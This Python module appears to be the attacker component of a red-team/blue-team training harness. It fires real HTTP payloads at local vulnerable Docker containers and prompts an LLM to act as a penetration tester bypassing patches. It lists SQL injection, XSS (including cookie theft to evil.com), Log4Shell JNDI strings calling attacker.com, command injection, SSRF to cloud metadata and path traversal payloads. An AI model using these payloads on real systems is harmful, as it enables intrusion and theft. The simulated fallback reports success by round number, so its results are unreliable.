"""
DataWatchDawgs — Red Agent (The Attacker)
Fires REAL HTTP requests at vulnerable Docker containers.
"""
import os, time, json, re, logging, requests as http
from dataclasses import dataclass, field
from typing import List, Optional

logger = logging.getLogger("dwd.red")

SYSTEM = """You are the Red Agent in DataWatchDawgs — a professional penetration tester.
Your role: ATTACK. Try to bypass the Blue Agent's patch using real-world techniques.

Respond with valid JSON only:
{
  "exploit_id": "RED-<round>-<type>",
  "strategy": "specific bypass technique",
  "payload_used": "exact payload string",
  "technique": "technique name",
  "success": true|false,
  "evidence": "what you observed",
  "why_patch_failed": "if success=true, exact reason patch failed"
}"""

PAYLOADS = {
    "sqli": [
        "' OR '1'='1",
        "'; DROP TABLE users;--",
        "' UNION SELECT username,password,role,id FROM users--",
        "1 AND SLEEP(5)--",
        "' OR 1=1 LIMIT 1--",
        "1; SELECT * FROM information_schema.tables--",
        "admin'--",
        "' OR 'x'='x",
    ],
    "xss": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(document.cookie)>",
        "<svg onload=fetch('//evil.com?c='+document.cookie)>",
        "javascript:alert(1)",
        "<body onload=alert(1)>",
        "<ScRiPt>alert(1)</ScRiPt>",
        "{{7*7}}",
        "<link rel=import href=data:text/html,<script>alert(1)</script>>",
    ],
    "rce": [
        "${jndi:ldap://attacker.com/exploit}",
        "${${::-j}${::-n}${::-d}${::-i}:ldap://x.com/a}",
        "${jndi:rmi://attacker.com/exploit}",
        "${${lower:j}ndi:ldap://x.com/a}",
        "${jndi:dns://attacker.com/test}",
        "; cat /etc/passwd",
        "| id",
        "$(id)",
    ],
    "ssrf": [
        "http://169.254.169.254/latest/meta-data/",
        "http://localhost:6379/",
        "file:///etc/passwd",
        "http://internal.corp/admin",
        "dict://localhost:6379/info",
        "http://0.0.0.0:22",
        "http://[::1]:80",
        "http://2130706433/",
    ],
    "path": [
        "../../../etc/passwd",
        "....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2fetc%2fshadow",
        "../../../var/www/html/shell.php",
        "..\\..\\..\\windows\\system32\\cmd.exe",
        "/etc/passwd%00.jpg",
        "....\\....\\etc\\passwd",
        "../secret.txt",
    ],
}

BYPASS_TECHNIQUES = {
    "sqli":  ["Classic OR bypass","Union extraction","Time-based blind","Boolean blind","Stacked queries","Schema enum","Comment injection","Case variation"],
    "xss":   ["Basic script","Image onerror","SVG onload","Protocol bypass","Body onload","Case variation","Template injection","CSP bypass"],
    "rce":   ["JNDI injection","JNDI obfuscation","RMI protocol","Lower-case bypass","DNS exfil","Shell semicolon","Pipe injection","Subshell"],
    "ssrf":  ["AWS metadata","Redis localhost","File protocol","Internal network","Dict protocol","Zero IP","IPv6 localhost","Decimal IP"],
    "path":  ["Classic traversal","Double-dot bypass","URL encoding","Web shell plant","Windows separator","Null byte","Mixed slash","Relative path"],
}


@dataclass
class ExploitResult:
    exploit_id: str
    round_num: int
    vuln_type: str
    payload_used: str
    technique: str
    strategy: str
    success: bool
    evidence: str
    why_patch_failed: str
    payloads_tried: int
    http_status: int = 0
    response_snippet: str = ""
    timestamp: float = field(default_factory=time.time)

    def to_dict(self):
        return {k: v for k, v in self.__dict__.items()}

    def to_feedback(self):
        if not self.success:
            return f"All {self.payloads_tried} payloads blocked. HTTP {self.http_status}. Patch holding."
        return (
            f"BYPASS SUCCESSFUL\n"
            f"Payload: {self.payload_used}\n"
            f"Technique: {self.technique}\n"
            f"HTTP Status: {self.http_status}\n"
            f"Evidence: {self.evidence}\n"
            f"Response: {self.response_snippet}\n"
            f"Why patch failed: {self.why_patch_failed}"
        )


class RedAgent:
    def __init__(self):
        self._results = []

    def attack(self, cve, patch, round_num: int,
               target_url: str = None) -> ExploitResult:
        vuln_type = cve.get("type_key", "sqli")
        port_map = {"sqli":8081,"xss":8082,"rce":8083,"ssrf":8084,"path":8085}
        url = target_url or f"http://localhost:{port_map.get(vuln_type, 8081)}"

        logger.info(f"[RED] Round {round_num} — attacking {cve['id']} at {url}")

        payloads = PAYLOADS.get(vuln_type, PAYLOADS["sqli"])
        techniques = BYPASS_TECHNIQUES.get(vuln_type, BYPASS_TECHNIQUES["sqli"])
        payload = payloads[min(round_num - 1, len(payloads) - 1)]
        technique = techniques[min(round_num - 1, len(techniques) - 1)]

        # Try real HTTP attack first
        http_result = self._send_exploit(url, vuln_type, payload, technique)

        if http_result.get("target_offline"):
            result = self._llm_or_simulate(
                cve, patch, round_num, vuln_type, payload, technique, payloads
            )
        else:
            success = http_result.get("success", False)
            result = ExploitResult(
                exploit_id=f"RED-{round_num}-{vuln_type}",
                round_num=round_num,
                vuln_type=vuln_type,
                payload_used=payload,
                technique=technique,
                strategy=f"Real HTTP attack — {technique}",
                success=success,
                evidence=http_result.get("evidence", ""),
                why_patch_failed=http_result.get("evidence", "") if success else "",
                payloads_tried=len(payloads),
                http_status=http_result.get("status", 0),
                response_snippet=http_result.get("response_snippet", ""),
            )

        self._results.append(result)
        return result

    def _send_exploit(self, base_url, vuln_type, payload, technique) -> dict:
        endpoints = {
            "sqli": [
                ("GET",  f"{base_url}/search",  {"q": payload}, None),
                ("POST", f"{base_url}/login",   None, {"username": payload, "password": "x"}),
                ("GET",  f"{base_url}/user",    {"id": payload}, None),
            ],
            "xss": [
                ("GET",  f"{base_url}/search",  {"q": payload}, None),
                ("POST", f"{base_url}/comment", None, {"body": payload}),
                ("GET",  f"{base_url}/",        {"name": payload}, None),
            ],
            "rce": [
                ("POST", f"{base_url}/ping",    None, {"host": payload}),
                ("POST", f"{base_url}/log",     None, {"message": payload}),
                ("POST", f"{base_url}/execute", None, {"cmd": payload}),
            ],
            "ssrf": [
                ("POST", f"{base_url}/fetch",   None, {"url": payload}),
                ("POST", f"{base_url}/pdf",     None, {"url": payload}),
            ],
            "path": [
                ("GET",  f"{base_url}/read",    {"file": payload}, None),
                ("POST", f"{base_url}/upload",  None, {"filename": payload, "content": "pwned"}),
            ],
        }

        for method, url, params, data in endpoints.get(vuln_type, []):
            try:
                if method == "GET":
                    resp = http.get(url, params=params, timeout=5, allow_redirects=True)
                else:
                    resp = http.post(url, data=data, timeout=5, allow_redirects=True)

                body = resp.text
                body_lower = body.lower()
                snippet = body[:300]

                success, evidence = self._check_success(
                    vuln_type, body, body_lower, resp.status_code, payload
                )

                if success:
                    return {
                        "status": resp.status_code,
                        "success": True,
                        "evidence": evidence,
                        "response_snippet": snippet,
                    }

            except http.exceptions.ConnectionError:
                logger.debug(f"Target offline: {base_url}")
                return {"target_offline": True}
            except http.exceptions.Timeout:
                if "sleep" in payload.lower() or "waitfor" in payload.lower():
                    return {
                        "status": 0,
                        "success": True,
                        "evidence": "Time-based blind SQLi — server timed out on SLEEP()",
                        "response_snippet": "Request timed out",
                    }
                return {"target_offline": True}
            except Exception as e:
                logger.debug(f"Request error: {e}")

        return {"status": 200, "success": False,
                "evidence": "All payloads blocked", "response_snippet": ""}

    def _check_success(self, vuln_type, body, body_lower, status, payload) -> tuple:
        if vuln_type == "sqli":
            for err in ["syntax error","sqlite","mysql error","you have an error","unclosed quotation"]:
                if err in body_lower:
                    return True, f"SQL error in response: '{err}'"
            for ind in ["secret123","pass456","admin",'"role"']:
                if ind in body_lower:
                    return True, f"Sensitive data leaked: '{ind}'"
            if body_lower.count('"id"') > 1 or body_lower.count('"username"') > 1:
                return True, "Multiple rows returned — UNION attack succeeded"

        elif vuln_type == "xss":
            if "<script>" in body and "alert" in body_lower:
                return True, "XSS payload <script> reflected unescaped in response"
            if "onerror=" in body and "alert" in body_lower:
                return True, "XSS onerror event handler reflected in response"
            if "<svg" in body and "onload=" in body:
                return True, "SVG onload XSS reflected in response"
            if payload.lower() in body_lower and any(c in payload for c in ["<",">"]):
                return True, "Payload reflected unencoded in response"

        elif vuln_type == "rce":
            for ind in ["jndi lookup",'vulnerable": true',"log4j","jndi lookup attempted","ldap://"]:
                if ind in body_lower:
                    return True, f"RCE indicator in response: '{ind}'"
            for ind in ["root:","uid=","bin/bash","total ","drwx"]:
                if ind in body:
                    return True, f"Command output detected: '{ind}'"

        elif vuln_type == "ssrf":
            if status == 200 and any(x in body_lower for x in ["ami-id","instance-id","meta-data","redis","+pong","root:"]):
                return True, "SSRF — internal content returned in response"
            if '"content"' in body_lower and status == 200:
                if any(x in payload for x in ["169.254","localhost","127.","0.0.0.0","internal"]):
                    return True, f"SSRF — internal URL fetched: {payload}"

        elif vuln_type == "path":
            for ind in ["secret_key=","db_pass=","secret123","root:x:","bin/bash",'vulnerable": true']:
                if ind in body_lower:
                    return True, f"Path traversal — sensitive content: '{ind}'"
            if '"content"' in body_lower and ".." in payload:
                return True, "Path traversal — file content returned"

        return False, ""

    def _llm_or_simulate(self, cve, patch, round_num, vuln_type,
                          payload, technique, payloads) -> ExploitResult:
        result = self._call_groq(cve, patch, round_num, vuln_type, payload, technique, payloads)
        if result:
            return result
        result = self._call_ollama(cve, patch, round_num, vuln_type, payload, technique, payloads)
        if result:
            return result
        return self._simulate(round_num, vuln_type, payload, technique, payloads)

    def _call_groq(self, cve, patch, round_num, vuln_type,
                   payload, technique, payloads) -> Optional[ExploitResult]:
        key = os.getenv("GROQ_API_KEY", "")
        if not key:
            return None
        try:
            from groq import Groq
            client = Groq(api_key=key)
            prompt = self._build_prompt(cve, patch, round_num, payload, technique)
            resp = client.chat.completions.create(
                model="llama-3.3-70b-versatile",
                messages=[
                    {"role": "system", "content": SYSTEM},
                    {"role": "user", "content": prompt}
                ],
                max_tokens=400,
                temperature=0.2
            )
            return self._parse_llm(
                resp.choices[0].message.content,
                round_num, vuln_type, payload, technique, payloads
            )
        except Exception as e:
            logger.warning(f"Groq error: {e}")
            return None

    def _call_ollama(self, cve, patch, round_num, vuln_type,
                     payload, technique, payloads) -> Optional[ExploitResult]:
        try:
            prompt = self._build_prompt(cve, patch, round_num, payload, technique)
            resp = http.post(
                "http://localhost:11434/api/generate",
                json={
                    "model": "gemma3:4b",
                    "prompt": SYSTEM + "\n\n" + prompt,
                    "stream": False,
                    "options": {"temperature": 0.2}
                },
                timeout=120
            )
            return self._parse_llm(
                resp.json().get("response", ""),
                round_num, vuln_type, payload, technique, payloads
            )
        except Exception as e:
            logger.debug(f"Ollama not available: {e}")
            return None

    def _build_prompt(self, cve, patch, round_num, payload, technique) -> str:
        return (
            f"Vulnerability: {cve['id']} — {cve['name']}\n"
            f"CVSS: {cve['cvss']}\n"
            f"Blue patch round {round_num}:\n"
            f"  Root cause fixed: {patch.root_cause}\n"
            f"  Patch type: {patch.patch_type}\n"
            f"  Blue admits weaknesses: {patch.bypass_vectors}\n\n"
            f"Payload to test: {payload}\n"
            f"Technique: {technique}\n\n"
            f"Did this payload bypass the patch? JSON only."
        )

    def _parse_llm(self, raw, round_num, vuln_type,
                   payload, technique, payloads) -> Optional[ExploitResult]:
        if not raw:
            return None
        try:
            clean = re.sub(r"```json|```", "", raw).strip()
            match = re.search(r'\{.*\}', clean, re.DOTALL)
            if not match:
                return None
            d = json.loads(match.group())
            success = bool(d.get("success", False))
            return ExploitResult(
                exploit_id=d.get("exploit_id", f"RED-{round_num}-{vuln_type}"),
                round_num=round_num,
                vuln_type=vuln_type,
                payload_used=d.get("payload_used", payload),
                technique=d.get("technique", technique),
                strategy=d.get("strategy", f"LLM-guided {technique}"),
                success=success,
                evidence=d.get("evidence", ""),
                why_patch_failed=d.get("why_patch_failed", "") if success else "",
                payloads_tried=len(payloads),
            )
        except Exception as e:
            logger.debug(f"LLM parse error: {e}")
            return None

    def _simulate(self, round_num, vuln_type, payload,
                  technique, payloads) -> ExploitResult:
        success = round_num <= 2
        if success:
            evidence_map = {
                "sqli": "SQL error in response — raw query data returned",
                "xss":  "Payload reflected unescaped in page body",
                "rce":  "JNDI lookup triggered — command output in response",
                "ssrf": "Internal metadata endpoint responded with credentials",
                "path": "File contents from outside upload dir returned",
            }
            why_map = {
                "sqli": f"Patch missed {technique} variant — encoding not normalized",
                "xss":  f"CSP not set — {technique} bypassed sanitization",
                "rce":  f"WAF rule did not cover {technique} obfuscation",
                "ssrf": f"Allowlist checked hostname but not resolved IP",
                "path": f"basename() missing — {technique} not caught",
            }
            return ExploitResult(
                exploit_id=f"RED-{round_num}-{vuln_type}",
                round_num=round_num, vuln_type=vuln_type,
                payload_used=payload, technique=technique,
                strategy=f"Simulation — {technique}",
                success=True,
                evidence=evidence_map.get(vuln_type, "Exploit succeeded"),
                why_patch_failed=why_map.get(vuln_type, f"Patch missed {technique}"),
                payloads_tried=len(payloads),
            )
        return ExploitResult(
            exploit_id=f"RED-{round_num}-{vuln_type}",
            round_num=round_num, vuln_type=vuln_type,
            payload_used=payload, technique=technique,
            strategy=f"Simulation — {technique}",
            success=False,
            evidence=f"All {len(payloads)} payloads blocked by evolved patch",
            why_patch_failed="",
            payloads_tried=len(payloads),
        )

    def get_results(self):
        return [r.to_dict() for r in self._results]